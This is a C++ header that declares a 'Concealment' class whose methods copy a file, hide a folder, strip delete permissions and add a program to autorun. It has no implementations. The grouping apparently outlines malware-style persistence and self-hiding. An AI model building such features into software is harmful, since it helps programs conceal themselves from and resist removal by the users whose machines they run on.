#pragma once
#include <string>
#include <ShlObj.h>
#include <AclAPI.h>
#include <vector>

class Concealment
{
public:
	static bool Replicate(std::wstring fileName, std::wstring newFileName);
	static bool HideFolder(std::wstring path);
	static bool RemoveDeletePermission(std::wstring path);
	static bool AddToAutorun(std::wstring path, std::wstring name, std::vector<std::wstring> args);
};

